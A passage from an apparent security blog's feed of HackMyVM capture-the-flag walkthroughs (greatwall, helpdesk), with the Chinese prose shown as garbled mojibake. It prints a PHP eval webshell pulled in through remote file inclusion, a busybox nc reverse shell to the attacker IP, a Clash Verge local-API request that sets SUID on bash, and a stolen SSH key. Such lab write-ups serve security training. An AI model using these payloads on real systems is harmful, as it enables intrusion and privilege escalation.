ÂõûÂà∞ KaliÔºå‰ΩøÁî® `strings` ÂëΩ‰ª§Ê£ÄÊü•ÂõæÁâáÊñá‰ª∂‰∏≠ÊòØÂê¶ÈöêËóè‰∫ÜÂèØÊâìÂç∞ÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇËøôÁßçÊñπÊ≥ïÂ∏∏Áî®‰∫éÂú®Êñá‰ª∂‰∏≠ÂØªÊâæË¢´ÈöêËóèÁöÑ‰ø°ÊÅØÔºà‰∏ÄÁßçÁÆÄÂçïÁöÑÈöêÂÜôÊúØÔºâ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ strings use-fim-to-root.png | tail -n 1
;HMV-FLAG[[ p3vhKP9d97a7HMV79ad9ks2s9 ]]
```

Âú®Êñá‰ª∂ÁöÑÊú´Â∞æÊàêÂäüÊâæÂà∞‰∫ÜÊúÄÁªàÁöÑ root flag„ÄÇÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Nexus.html</guid><pubDate>Sun, 24 Aug 2025 09:42:13 +0000</pubDate></item><item><title>hmv_greatwall</title><link>https://7r1UMPHK.github.io/post/hmv_greatwall.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1.1. ‰∏ªÊú∫ÂèëÁé∞**

È¶ñÂÖàÔºåÂú®ÁõÆÊ†áÁΩëÊÆµÂÜÖ‰ΩøÁî®`arp-scan`Â∑•ÂÖ∑ËøõË°å‰∏ªÊú∫ÂèëÁé∞ÔºåÁ°ÆÂÆöÁõÆÊ†áÈù∂Êú∫ÁöÑIPÂú∞ÂùÄ„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.131 00:0c:29:24:e9:11       VMware, Inc.
...
```

‰ªéÊâ´ÊèèÁªìÊûú‰∏≠ÔºåÊàë‰ª¨ËØÜÂà´Âá∫ÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄ‰∏∫ `192.168.205.131`„ÄÇ

## **1.2. Á´ØÂè£Êâ´Êèè**

Êé•‰∏ãÊù•Ôºå‰ΩøÁî®`rustscan`ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÁ´ØÂè£Êâ´ÊèèÔºå‰ª•ÂèëÁé∞ÂÖ∂ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ rustscan -a 192.168.205.131
...
Open 192.168.205.131:22
Open 192.168.205.131:80
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†á‰∏ªÊú∫ÂºÄÊîæ‰∫Ü‰∏§‰∏™Á´ØÂè£Ôºö22 (SSH) Âíå 80 (HTTP)„ÄÇ

## **1.3. WebÊúçÂä°Êé¢Êü•**

ËÆøÈóÆÁõÆÊ†á `http://192.168.205.131`ÔºåÂèëÁé∞‰∏Ä‰∏™WebÈ°µÈù¢ÔºåÈ°µÈù¢‰∏äÊúâ‰∏Ä‰∏™ËæìÂÖ•Ê°ÜÔºåÊèêÁ§∫ËØ≠‰∏∫ 'Across the Great Wall we can reach every corner in the world'„ÄÇ

Êü•ÁúãÈ°µÈù¢Ê∫ê‰ª£Á†ÅÔºåÂèØ‰ª•ÂèëÁé∞‰∏Ä‰∏™GETÊñπÊ≥ïÊèê‰∫§ÁöÑË°®ÂçïÔºåÂèÇÊï∞Âêç‰∏∫ `page`„ÄÇ

```html
&lt;body&gt;
    ...
    &lt;form method='GET' class='address-form'&gt;
        &lt;input type='text' name='page' class='address-bar' placeholder='https://'&gt;
    &lt;/form&gt;
    ...
&lt;/body&gt;
```

# **‰∫å„ÄÅÊºèÊ¥ûÂà©Áî® (Ëé∑ÂèñWebshell)**

## **2.1. LFIÊºèÊ¥û‰∏éÂá∫Á´ôÈò≤ÁÅ´Â¢ôÁ≠ñÁï•ÂèëÁé∞**

Ê†πÊçÆÂäüËÉΩÁåúÊµãÔºå`page`ÂèÇÊï∞ÂèØËÉΩÁî®‰∫éÂåÖÂê´ÊàñËØ∑Ê±ÇÂÖ∂‰ªñÈ°µÈù¢„ÄÇÈ¶ñÂÖàÂ∞ùËØï‰ΩøÁî® `file://` ÂçèËÆÆËØªÂèñÊú¨Âú∞Êñá‰ª∂ÔºåÊûÑÈÄ†PayloadÔºö`file:///etc/passwd`„ÄÇ

ÊúçÂä°Âô®ÊàêÂäüËøîÂõû‰∫Ü `/etc/passwd` Êñá‰ª∂ÁöÑÂÜÖÂÆπÔºåËØÅÂÆû‰∫ÜÊ≠§Â§ÑÂ≠òÂú®‰∏Ä‰∏™Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ (LFI) ÊºèÊ¥û„ÄÇ

Âú®Ëøõ‰∏ÄÊ≠•Âà©Áî®Êó∂ÔºåÊàë‰ª¨ÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÂÖ≥ÈîÆÈôêÂà∂ÔºöÂΩìÂ∞ùËØï‰ªéËøúÁ®ãÊúçÂä°Âô®ÂåÖÂê´Êñá‰ª∂ÊàñÂèëËµ∑ÂèçÂºπshellÊó∂ÔºåËØ∑Ê±ÇÂùá‰ºöÂ§±Ë¥•„ÄÇÁªèËøáÂ§öÊ¨°ÊµãËØïÔºåÂèëÁé∞**ËØ•ÊúçÂä°Âô®Â≠òÂú®Âá∫Á´ôÔºàEgressÔºâÈò≤ÁÅ´Â¢ôÁ≠ñÁï•**ÔºåËøôÂπ∂ÈùûWebÂ∫îÁî®Â±ÇÈù¢ÁöÑÂäüËÉΩÈôêÂà∂ÔºåËÄåÊòØÊõ¥Â∫ïÂ±ÇÁöÑÁΩëÁªúÈÖçÁΩÆÔºà‰æãÂ¶ÇiptablesÔºâ„ÄÇËØ•Á≠ñÁï•‰∏•Ê†ºÈôêÂà∂‰∫ÜÊúçÂä°Âô®ÂØπÂ§ñÂèëËµ∑ÁöÑËøûÊé•Ôºö**Âè™ÂÖÅËÆ∏ÂêëÁõÆÊ†áÁ´ØÂè£‰∏∫ 22 (SSH) Âíå 80 (HTTP) ÁöÑÂú∞ÂùÄÂª∫Á´ãËøûÊé•**„ÄÇ‰ªª‰ΩïËØïÂõæËøûÊé•Âà∞ÂÖ∂‰ªñÁ´ØÂè£ÔºàÂ¶ÇÂ∏∏Áî®ÁöÑ4444, 8080Á≠âÔºâÁöÑÂá∫Á´ôÊµÅÈáèÈÉΩ‰ºöË¢´ÈòªÊñ≠„ÄÇ

Ëøô‰∏ÄÂèëÁé∞Ëß£Èáä‰∫Ü‰∏∫‰ªÄ‰πàÊó†ËÆ∫ÊòØËøúÁ®ãÊñá‰ª∂ÂåÖÂê´ËøòÊòØÂèçÂºπshellÔºåÈÉΩÂøÖÈ°ªÂ∞ÜÊàë‰ª¨ÊîªÂáªÊú∫‰∏äÁöÑÁõëÂê¨ÊúçÂä°ËÆæÁΩÆÂú® 80 Êàñ 22 Á´ØÂè£„ÄÇ

## **2.2. ËøúÁ®ãÊñá‰ª∂ÂåÖÂê´Getshell**

Âà©Áî®LFIÊºèÊ¥ûÔºåÂπ∂ÈÅµ‰ªéÁõÆÊ†áÊúçÂä°Âô®ÁöÑÂá∫Á´ôÈò≤ÁÅ´Â¢ôÁ≠ñÁï•ÔºåÊàë‰ª¨ÂèØ‰ª•ËÆ©ÁõÆÊ†áÊúçÂä°Âô®ÂåÖÂê´Âπ∂ÊâßË°åÊàë‰ª¨Ëá™Â∑±ÊúçÂä°Âô®‰∏äÁöÑÊÅ∂ÊÑèPHPÊñá‰ª∂Ôºå‰ªéËÄåËé∑ÂèñWebshell„ÄÇ

1. **ÂáÜÂ§áWebshell**: Âú®KaliÊîªÂáªÊú∫‰∏äÂàõÂª∫‰∏Ä‰∏™ÁÆÄÂçïÁöÑPHP‰∏ÄÂè•ËØùÊú®È©¨ `ant.php`„ÄÇ

   ```shell
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ cat ant.php 
   &lt;?php eval($_POST['ant']); ?&gt;
   ```

2. **ÂºÄÂêØHTTPÊúçÂä°**: Âú®`ant.php`ÊâÄÂú®ÁõÆÂΩïÔºå‰ΩøÁî®PythonÂºÄÂêØ‰∏Ä‰∏™‰∏¥Êó∂ÁöÑHTTPÊúçÂä°Âô®„ÄÇ**Ê†πÊçÆÂâç‰∏ÄÊ≠•ÂèëÁé∞ÁöÑÂá∫Á´ôÈò≤ÁÅ´Â¢ôÁ≠ñÁï•ÔºåÊ≠§HTTPÊúçÂä°ÂøÖÈ°ªÂºÄÂêØÂú®80Á´ØÂè£**ÔºåÂê¶ÂàôÁõÆÊ†áÊúçÂä°Âô®Â∞ÜÊó†Ê≥ïËÆøÈóÆ„ÄÇ

   ```shell
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ sudo python3 -m http.server 80
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   ```

3. **ÂåÖÂê´ËøúÁ®ãWebshell**: Âú®ÁõÆÊ†áWebÈ°µÈù¢ÁöÑËæìÂÖ•Ê°Ü‰∏≠ÔºåÊûÑÈÄ†PayloadÊåáÂêëÊàë‰ª¨KaliÊîªÂáªÊú∫‰∏äÁöÑwebshellÔºö`http://192.168.205.128/ant.php`„ÄÇ

4. **ËøûÊé•Webshell**: ‰ΩøÁî®ËöÅÂâë (AntSword) ËøûÊé•ÁõÆÊ†áÔºåURL‰∏∫ `http://192.168.205.131/`ÔºåÂú®ËØ∑Ê±ÇÊï∞ÊçÆÁöÑ `page` ÂèÇÊï∞‰∏≠Â°´ÂÖ•Êàë‰ª¨ÁöÑËøúÁ®ãÈ©¨Âú∞ÂùÄ `http://192.168.205.128/ant.php`ÔºåËøûÊé•ÂØÜÁ†Å‰∏∫ `ant`„ÄÇ

ÊàêÂäüËøûÊé•ÂêéÔºåÊàë‰ª¨Ëé∑Âæó‰∫ÜÁõÆÊ†áÊúçÂä°Âô®ÁöÑWebshellÔºåÂΩìÂâçÁî®Êà∑‰∏∫ `www-data`„ÄÇ

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **3.1. www-data -&gt; wall**

Âú®Webshell‰∏≠ÔºåÊàë‰ª¨ÂèëÁé∞ÂΩìÂâçÁî®Êà∑ `www-data` ÂèØ‰ª•ÈÄöËøá `sudo` ‰ª• `wall` Áî®Êà∑ÁöÑË∫´‰ªΩÊâßË°å `chmod` ÂëΩ‰ª§„ÄÇ

```shell
(www-data:/var/www/html) $ sudo -l
...
User www-data may run the following commands on this host:
    (ALL : wall) NOPASSWD: /bin/chmod
```

ËôΩÁÑ∂ÂèØ‰ª•Áõ¥Êé•ÊâßË°å `chmod`Ôºå‰ΩÜÊó†Ê≥ïÁõ¥Êé•Âà©Áî®ÂÆÉÊù•‰øÆÊîπ `/bin/bash` Á≠âÁ≥ªÁªüÊñá‰ª∂ÁöÑÊùÉÈôê‰ª•Áõ¥Êé•ÊèêÊùÉ„ÄÇ‰ΩÜÊòØÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Ëøô‰∏™ÊùÉÈôêÊù•‰øÆÊîπ `wall` Áî®Êà∑ÂÆ∂ÁõÆÂΩïÁöÑÊùÉÈôêÔºå‰ªéËÄåËØªÂèñÂÖ∂SSHÁßÅÈí•„ÄÇ

1. **‰øÆÊîπwallÂÆ∂ÁõÆÂΩïÊùÉÈôê**:

   ```shell
   (www-data:/home) $ ls -la
   drwx------  4 wall wall 4096 May 11 02:41 wall
   (www-data:/home) $ sudo -u wall chmod 755 wall
   (www-data:/home) $ ls -la
   drwxr-xr-x  4 wall wall 4096 May 11 02:41 wall
   ```

2. **ËØªÂèñSSHÁßÅÈí•**: ËøõÂÖ• `wall` Áî®Êà∑ÁöÑ `.ssh` ÁõÆÂΩïÔºå‰øÆÊîπÁßÅÈí• `id_rsa` ÁöÑÊùÉÈôêÂπ∂ËØªÂèñÂÖ∂ÂÜÖÂÆπ„ÄÇ

   ```shell
   (www-data:/home/wall/.ssh) $ sudo -u wall chmod 600 id_rsa
   (www-data:/home/wall/.ssh) $ cat id_rsa
   -----BEGIN OPENSSH PRIVATE KEY-----
   b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
   ...
   QMXdH6a7iy89MAAAAOd2FsbEBncmVhdHdhbGwBAgMEBQ==
   -----END OPENSSH PRIVATE KEY-----
   ```

3. **SSHÁôªÂΩï**: Â∞ÜÂ§çÂà∂ÁöÑÁßÅÈí•‰øùÂ≠òÂú®KaliÊîªÂáªÊú∫Êú¨Âú∞Ôºà‰æãÂ¶Ç `/tmp/id_rsa`ÔºâÔºåËµã‰∫à `600` ÊùÉÈôêÔºåÁÑ∂Âêé‰ΩøÁî®ËØ•ÁßÅÈí•‰ª• `wall` Áî®Êà∑Ë∫´‰ªΩSSHÁôªÂΩïÁõÆÊ†á‰∏ªÊú∫„ÄÇ

   ```shell
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
   ‚îî‚îÄ$ vim id_rsa
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
   ‚îî‚îÄ$ chmod 600 id_rsa
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
   ‚îî‚îÄ$ ssh wall@192.168.205.131 -i /tmp/id_rsa
   Linux greatwall 6.1.0-32-amd64 ...
   wall@greatwall:~$ id
   uid=1000(wall) gid=1000(wall) groups=1000(wall)...
   ```

ÊàêÂäüÁôªÂΩïÂêéÔºåÊàë‰ª¨Ëé∑Âæó‰∫Ü `wall` Áî®Êà∑ÁöÑ‰∫§‰∫íÂºèShell„ÄÇ

## **3.2. wall -&gt; root**

ÁôªÂΩï`wall`Áî®Êà∑ÂêéÔºåÂÜçÊ¨°Ê£ÄÊü•`sudo`ÊùÉÈôê„ÄÇ

```shell
wall@greatwall:~$ sudo -l
Matching Defaults entries for wall on greatwall:
    ...
User wall may run the following commands on greatwall:
    (ALL) NOPASSWD: /usr/bin/systemctl start clash-verge-service
```

ÂèëÁé∞ `wall` Áî®Êà∑ÂèØ‰ª•Êó†ÂØÜÁ†ÅÂêØÂä® `clash-verge-service` ÊúçÂä°„ÄÇËøô‰∏éËøëÊúüÊä´Èú≤ÁöÑ **Clash Verge ÊùÉÈôêÊèêÂçáÊºèÊ¥û**ÁâπÂæÅÁõ∏Á¨¶„ÄÇ

&gt; [!Tip]
&gt;
&gt; https://mp.weixin.qq.com/s/fwIPGN79kf6_VAGkJOmz7w

**ÊºèÊ¥ûÂéüÁêÜÁÆÄÊûê**:
Clash Verge Âú®ÈÄöËøá `systemctl` ÂêØÂä®ÊúçÂä°Êó∂Ôºå‰ºöÁõëÂê¨‰∏Ä‰∏™Êú¨Âú∞ÁöÑHTTPÊé•Âè£ÔºàÈªòËÆ§‰∏∫ `127.0.0.1:33211`Ôºâ„ÄÇÊîªÂáªËÄÖÂèØ‰ª•ÂêëËØ•Êé•Âè£ÁöÑ `/start_clash` Ë∑ØÂæÑÂèëÈÄÅ‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑPOSTËØ∑Ê±Ç„ÄÇËØ∑Ê±Ç‰Ωì‰∏≠ÁöÑ `bin_path` ÂèÇÊï∞ÂèØ‰ª•ÊåáÂÆö‰∏Ä‰∏™Êú¨Âú∞ÁöÑÂèØÊâßË°åÊñá‰ª∂Ë∑ØÂæÑÔºåÊúçÂä°‰ºö‰ª•`root`ÊùÉÈôêÊâßË°åËøô‰∏™Êñá‰ª∂„ÄÇËøôÂ∞±ÈÄ†Êàê‰∫Ü‰∏Ä‰∏™Êú¨Âú∞ÊùÉÈôêÊèêÂçáÊºèÊ¥û„ÄÇ

**Âà©Áî®Ê≠•È™§**:

1. **ÂêØÂä®ÊºèÊ¥ûÊúçÂä°**: ‰ΩøÁî® `sudo` ÂêØÂä®ÊúçÂä°ÔºåÊøÄÊ¥ªÊºèÊ¥ûÊé•Âè£„ÄÇ

   ```shell
   wall@greatwall:~$ sudo /usr/bin/systemctl start clash-verge-service
   ```

2. **È™åËØÅÊúçÂä°ÁõëÂê¨**: ‰ΩøÁî® `ss` ÂëΩ‰ª§Á°ÆËÆ§ÊúçÂä°Â∑≤Âú®Êú¨Âú∞ `33211` Á´ØÂè£ÁõëÂê¨„ÄÇ

   ```shell
   wall@greatwall:~$ ss -tnlp
   State      Recv-Q     Send-Q         Local Address:Port      Peer Address:Port
   ...
   LISTEN     0          128                127.0.0.1:33211          0.0.0.0:*
   ...
   ```

3. **ÂàõÂª∫ÊèêÊùÉËÑöÊú¨**: Âú® `/tmp` ÁõÆÂΩï‰∏ãÂàõÂª∫‰∏Ä‰∏™ËÑöÊú¨ `a.sh`ÔºåÂÖ∂ÂäüËÉΩÊòØ‰∏∫ `/bin/bash` Ê∑ªÂä†SUIDÊùÉÈôê‰ΩçÔºåÂπ∂Ëµã‰∫àÂÖ∂ÊâßË°åÊùÉÈôê„ÄÇ

   ```shell
   wall@greatwall:/tmp$ cat &gt; a.sh &lt;&lt; EOF
   #!/bin/bash
   chmod +s /bin/bash
   EOF
   wall@greatwall:/tmp$ chmod +x a.sh
   ```

4. **ÂèëÈÄÅÊÅ∂ÊÑèËØ∑Ê±Ç**: ‰ΩøÁî® `curl` ÂêëÊú¨Âú∞ `33211` Á´ØÂè£ÁöÑ `/start_clash` Êé•Âè£ÂèëÈÄÅPOSTËØ∑Ê±ÇÔºåÈÄöËøá `bin_path` ÂèÇÊï∞ÊåáÂÆöÊâßË°åÊàë‰ª¨ÂàöÂàöÂàõÂª∫ÁöÑ `/tmp/a.sh` ËÑöÊú¨„ÄÇ

   ```shell
   wall@greatwall:/tmp$ curl -X POST 'http://127.0.0.1:33211/start_clash' \
   -H 'Content-Type: application/json' \
   -d '{'bin_path': '/tmp/a.sh', 'config_dir': '', 'config_file': '', 'log_file': '/dev/null'}'
   
   {'code':0,'msg':'ok','data':null}
   ```

5. **Ëé∑ÂèñRoot Shell**: Ê£ÄÊü• `/bin/bash` ÁöÑÊùÉÈôêÔºåÂèØ‰ª•ÁúãÂà∞Â∑≤ÁªèÊ∑ªÂä†‰∫ÜSUID‰Ωç„ÄÇÊ≠§Êó∂ÊâßË°å `bash -p` Âç≥ÂèØËé∑Âæó‰∏Ä‰∏™ `euid` ‰∏∫ `root` ÁöÑshell„ÄÇ

   ```shell
   wall@greatwall:/tmp$ ls -la /bin/bash
   -rwsr-sr-x 1 root root 1265648 Mar 30  2024 /bin/bash
   wall@greatwall:/tmp$ bash -p
   bash-5.2# id
   uid=1000(wall) gid=1000(wall) euid=0(root) egid=0(root) groups=0(root)...
   ```

6. **ËØªÂèñFlag**: Ëá≥Ê≠§ÔºåÊàë‰ª¨Â∑≤ÊàêÂäüÊèêÊùÉËá≥rootÔºåÂèØ‰ª•ËØªÂèñÊâÄÊúâflag„ÄÇ

   ```shell
   bash-5.2# cat /root/r007.7x7oZzZzZzzzz /home/wall/user.flag
   flag{b3d2a9f34869484b74db97411cf1eb3b}
   flag{b088764475fa2a0a962fb9154f41c5b6}
   ```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_greatwall.html</guid><pubDate>Sun, 24 Aug 2025 07:37:26 +0000</pubDate></item><item><title>hmv_helpdesk</title><link>https://7r1UMPHK.github.io/post/hmv_helpdesk.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## **1. ‰∏ªÊú∫ÂèëÁé∞**

È¶ñÂÖàÔºåÈÄöËøá `arp-scan` ÂØπÊú¨Âú∞ÁΩëÁªúËøõË°åÊâ´ÊèèÔºå‰ª•ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.142 08:00:27:e5:04:39       PCS Systemtechnik GmbH
...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.142`„ÄÇ

## **2. Á´ØÂè£Êâ´Êèè**

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•Á°ÆÂÆöÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.142
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 11:18 EDT
Nmap scan report for 192.168.205.142
Host is up (0.0011s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E5:04:39 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

Êâ´ÊèèÂèëÁé∞‰∏ªÊú∫ÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 80 (HTTP) Á´ØÂè£„ÄÇ

## **3. WebÁõÆÂΩïÊâ´Êèè**

ËÆøÈóÆ80Á´ØÂè£ÔºåÈ°µÈù¢ÊòæÁ§∫‰∏∫‰∏Ä‰∏™Ê≠£Âú®Áª¥Êä§ÁöÑ‚ÄúHelpDesk Ticketing System‚Äù„ÄÇ‰∏∫‰∫ÜÂØªÊâæÊõ¥Â§ö‰ø°ÊÅØÔºå‰ΩøÁî® `dirsearch` Âíå `gobuster` ËøõË°åÁõÆÂΩïÁàÜÁ†¥„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ dirsearch -u http://192.168.205.142/     
...
[11:19:21] 200 -  214B  - /debug.php
[11:19:24] 301 -  242B  - /javascript  -&gt;  http://192.168.205.142/javascript/
[11:19:25] 200 -  756B  - /login.php
[11:19:27] 302 -    0B  - /panel.php  -&gt;  login.php
...

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.142 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
...
/index.php            (Status: 200) [Size: 1290]
/login.php            (Status: 200) [Size: 1819]
/ticket.php           (Status: 200) [Size: 204]
/panel.php            (Status: 302) [Size: 0] [--&gt; login.php]
/debug.php            (Status: 200) [Size: 250]
...
```

Êâ´ÊèèÂèëÁé∞‰∫ÜÂá†‰∏™ÂÖ≥ÈîÆÊñá‰ª∂Ôºö`debug.php`, `login.php`, `panel.php` Âíå `ticket.php`„ÄÇ

ËÆøÈóÆ `debug.php` È°µÈù¢ÔºåÂèëÁé∞‰∫Ü‰∏ÄÁªÑÂá≠ËØÅÔºå‰ΩÜÁªèËøáÂ∞ùËØïÔºåËøôÁªÑÂá≠ËØÅÊó†Ê≥ïÁî®‰∫éÁôªÂΩïÔºåÂ±û‰∫éËØØÂØº‰ø°ÊÅØ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.142/debug.php   
&lt;style&gt;
...
&lt;/style&gt;&lt;h2&gt;Debug Mode Enabled&lt;/h2&gt;&lt;pre&gt;[DEBUG] Connecting to internal dev server...
[DEBUG] Using creds: service_user:SuperSecretDev123!&lt;/pre&gt;
```

# ‰∫å„ÄÅÊºèÊ¥ûÂà©Áî®

## **1. Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ (LFI)**

`ticket.php` È°µÈù¢ÁúãËµ∑Êù•ÂÉè‰∏Ä‰∏™Á•®ÊçÆÊü•ÁúãÂô®ÔºåÂ∞ùËØï‰ΩøÁî® `ffuf` ÂØπÂÖ∂ÂèÇÊï∞ËøõË°åÊ®°Á≥äÊµãËØï„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ffuf -w ... -u 'http://192.168.205.142/ticket.php?FUZZ=id' --fw 24
...
url                     [Status: 200, Size: 271, Words: 30, Lines: 5, Duration: 0ms]
...
```

Fuzzing ÂèëÁé∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `url` ÁöÑÂèÇÊï∞„ÄÇÈÄöËøáËØ•ÂèÇÊï∞ÔºåÂèØ‰ª•ËØªÂèñ `login.php` ÁöÑÊ∫ê‰ª£Á†ÅÔºåÁ°ÆËÆ§Â≠òÂú®Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.142/ticket.php?url=login.php'
...
&lt;h1&gt;Ticket Viewer&lt;/h1&gt;&lt;pre&gt;&lt;?php
session_start();
...
// Stored credentials
$stored_user = 'helpdesk';

// SHA-512 hash for password: ticketmaster
$stored_hash = '$6$ABC123$fLo2MacCV.XBQeRZtHWL2297q/fUBs/b8gOmvLGuiz7wDgl3MSWcOOSKnTbaNPoUMCmEpY1dlwuPKbAtIuoo6.';
...
?&gt;
...
```

‰ªé `login.php` ÁöÑÊ∫êÁ†Å‰∏≠ÔºåËé∑Âæó‰∫ÜÁî®Êà∑Âêç `helpdesk` ÂíåÂØÜÁ†Å `ticketmaster` ÁöÑÂìàÂ∏åÂÄº„ÄÇ‰ΩøÁî® `helpdesk:ticketmaster` ÊàêÂäüÁôªÂΩï‰∫ÜWebÂêéÂè∞„ÄÇ

## **2. ÂëΩ‰ª§ÊâßË°å‰∏éÂèçÂºπShell**

ÁôªÂΩïÂêéÁöÑÈù¢ÊùøÂ≠òÂú®ÂëΩ‰ª§ÊâßË°åÂäüËÉΩ„ÄÇÂà©Áî®ËØ•ÂäüËÉΩÔºåÈÄöËøá `busybox nc` Ëé∑Âèñ‰∏Ä‰∏™ÂèçÂºπshell„ÄÇ

Âú®Kali‰∏äÁõëÂê¨8888Á´ØÂè£Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888
```

Âú®WebÈù¢Êùø‰∏≠ÊâßË°åÔºö

```bash
busybox nc 192.168.205.128 8888 -e /bin/bash
```

ÊàêÂäüËé∑Âèñ `www-data` Áî®Êà∑ÁöÑshell„ÄÇ

```bash
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 51576
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

‰∏∫Êñπ‰æøÂêéÁª≠Êìç‰ΩúÔºåÈÄöËøá‰ª•‰∏ãÊ≠•È™§Á®≥ÂÆöshellÔºö

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## **1. www-data -&gt; helpdesk**

Âú®ÁõÆÊ†á‰∏ªÊú∫‰∏äËøõË°å‰ø°ÊÅØÊêúÈõÜÔºåÂú® `/opt/helpdesk-socket/` ÁõÆÂΩï‰∏ãÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÂèØÂà©Áî®ÁöÑUnixÂ•óÊé•Â≠ó„ÄÇ

```bash
www-data@helpdesk:/opt/helpdesk-socket$ ls -al
total 16
drwxr-xr-x 2 helpdesk helpdesk 4096 Aug 23 15:17 .
drwxr-xr-x 4 root     root     4096 Aug 16 15:32 ..
-rwxr-xr-x 1 helpdesk helpdesk  158 Aug 16 15:32 handler.sh
srwxrwxrwx 1 helpdesk helpdesk    0 Aug 23 15:17 helpdesk.sock
-rw-r--r-- 1 root     root      184 Aug 16 15:44 serve.sh
```

Êü•Áúã `handler.sh` Âíå `serve.sh` ËÑöÊú¨ÂÜÖÂÆπÔºö

```bash
www-data@helpdesk:/opt/helpdesk-socket$ cat *
#!/bin/bash
# Simple parser ‚Äî executes anything sent over the socket (dangerous!)
read cmd
echo '[HelpDesk Automation] Executing: $cmd'
/bin/bash -c '$cmd'
cat: helpdesk.sock: No such device or address
#!/bin/bash

SOCKET='/opt/helpdesk-socket/helpdesk.sock'

[ -e '$SOCKET' ] &amp;&amp; rm '$SOCKET'

/usr/bin/socat -d -d UNIX-LISTEN:$SOCKET,fork,mode=777 EXEC:/opt/helpdesk-socket/handler.sh
```

**Áü•ËØÜÁÇπË°•ÂÖÖÔºösocat ‰∏é UNIX Socket**

*   **socat**ÔºöÊòØ‰∏Ä‰∏™Âº∫Â§ßÁöÑÁΩëÁªúÂ∑•ÂÖ∑ÔºåÂ†™Áß∞netcatÁöÑÂ¢ûÂº∫Áâà„ÄÇ ÂÆÉÁöÑÊ†∏ÂøÉÂäüËÉΩÊòØÂú®‰∏§‰∏™Êï∞ÊçÆÊµÅ‰πãÈó¥Âª∫Á´ã‰∏Ä‰∏™ÂèåÂêëÈÄöÈÅì„ÄÇ Ëøô‰∫õÊï∞ÊçÆÊµÅÂèØ‰ª•ÊòØÊñá‰ª∂„ÄÅÁÆ°ÈÅì„ÄÅËÆæÂ§á„ÄÅTCP/UDPÂ•óÊé•Â≠óÔºåÁîöËá≥ÊòØÊâßË°åÁöÑÁ®ãÂ∫è„ÄÇ
